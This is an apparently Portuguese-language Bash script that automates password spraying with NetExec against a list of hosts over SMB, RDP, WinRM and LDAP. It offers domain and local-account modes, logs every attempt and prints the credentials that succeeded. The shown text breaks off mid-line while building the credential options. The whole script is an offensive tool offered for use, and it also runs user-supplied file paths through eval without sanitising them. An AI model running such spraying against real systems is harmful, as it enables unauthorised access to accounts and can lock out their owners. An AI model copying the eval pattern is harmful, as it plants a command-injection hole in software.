#!/bin/bash

# --- Cores para o output ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # Sem Cor
# ---------------------------

# Variável global para a contagem sequencial dos sprays
SPRAY_COUNT=1

# Lista de protocolos a serem testados
PROTOCOLS=(smb rdp winrm ldap)

# --- Funções de Execução do Spray ---

execute_domain_spray() {
    local TARGETS_FILE=$1
    local DOMAIN=$2
    local CRED_FLAGS=$3
    local LOG_FILE=$4

    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando SPRAY DE DOMÍNIO em múltiplos protocolos...${NC}" | tee -a "$LOG_FILE"

    for proto in "${PROTOCOLS[@]}"; do
        if [ "$proto" == "ssh" ]; then continue; fi

        echo "" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Iniciando testes de DOMÍNIO para o protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"

        eval "unbuffer nxc $proto '$TARGETS_FILE' $CRED_FLAGS -d '$DOMAIN' --continue-on-success" | tee -a "$LOG_FILE"
    done
}

execute_local_spray() {
    local TARGETS_FILE=$1
    local CRED_FLAGS=$2
    local LOG_FILE=$3

    echo "" | tee -a "$LOG_FILE"
    echo -e "${YELLOW}[*] Iniciando SPRAY LOCAL em múltiplos protocolos...${NC}" | tee -a "$LOG_FILE"

    for proto in "${PROTOCOLS[@]}"; do
        if [ "$proto" == "ldap" ]; then continue; fi

        echo "" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[+] Iniciando testes LOCAIS para o protocolo: $proto${NC}" | tee -a "$LOG_FILE"
        echo "=================================================" | tee -a "$LOG_FILE"
        
        eval "unbuffer nxc $proto '$TARGETS_FILE' $CRED_FLAGS --local-auth --continue-on-success" | tee -a "$LOG_FILE"
    done
}

# --- Funções Auxiliares ---

display_summary() {
    local LOG_FILE=$1
    echo ""
    echo "================================================="
    echo -e "${GREEN}        Resumo dos Acessos Válidos${NC}"
    echo "================================================="
    echo " (Resultados mostram DOMINIO\\usuário ou HOSTNAME\\usuário)"
    echo "-------------------------------------------------"
    grep --color=always "\[+\]" "$LOG_FILE" | grep -v "Iniciando testes"
    echo ""
    echo "[*] Script finalizado."
}

# --- Função Principal que Gerencia a Coleta de Dados e a Execução ---
run_spray_manager() {
    local spray_type=$1 # "domain", "local", ou "full"

    # Comando 'clear' foi removido daqui
    echo -e "\nModo de Spray Selecionado: ${spray_type^^}"
    echo "-------------------------------------"
    read -p "Digite o caminho para o arquivo de ALVOS (ex: targets.txt): " TARGETS_FILE
    if [ ! -f "$TARGETS_FILE" ]; then echo -e "${RED}Erro: Arquivo de alvos não encontrado.${NC}"; return; fi
    
    echo ""
    echo "Como você quer fornecer as credenciais?"
    echo "1) Usar arquivos (users.txt e pass.txt)"
    echo "2) Usar credencial única (usuário e senha)"
    read -p "Escolha uma opção [1-2]: " cred_choice

    local creds=""
    
    if [ "$cred_choice" == "1" ]; then
        read -p "Digite o caminho para o arquivo de USUÁRIOS (ex: users.txt): " USERS_FILE
        if [ ! -f "$USERS_FILE" ]; then echo -e "${RED}Erro: Arquivo de usuários não encontrado.${NC}"; return; fi
        read -p "Digite o caminho para o arquivo de SENHAS (ex: pass.txt): " PASSWORDS_FILE
        if [ ! -f "$PASSWORDS_FILE" ]; then echo -e "${RED}Erro: Arquivo de senhas não encontrado.${NC}"; return; fi
        creds="-u '$USERS_FILE' -p '$PASSWORDS
